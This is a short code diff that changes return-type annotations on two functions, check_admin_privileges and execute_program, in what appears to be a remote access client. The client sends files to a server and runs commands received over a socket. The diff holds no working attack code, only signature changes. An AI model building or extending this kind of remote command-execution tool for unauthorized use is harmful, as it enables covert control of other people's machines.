@@ -168,7 +168,7 @@ def send_file_to_server(sock, file_path, max_size_mb=10):
         return "[!] Error"
 
 
-def check_admin_privileges(socket) -> Tuple[bool, str]:
+def check_admin_privileges(socket) -> bool:
     try:
         if os.name == "nt":
             try:
@@ -210,7 +210,7 @@ def check_admin_privileges(socket) -> Tuple[bool, str]:
         return False
 
 
-def execute_program(socket, command: str) -> Tuple[bool, str]:
+def execute_program(socket, command: str) -> bool:
     try:
         executable = command[4:] if command.startswith("run ") else command
 
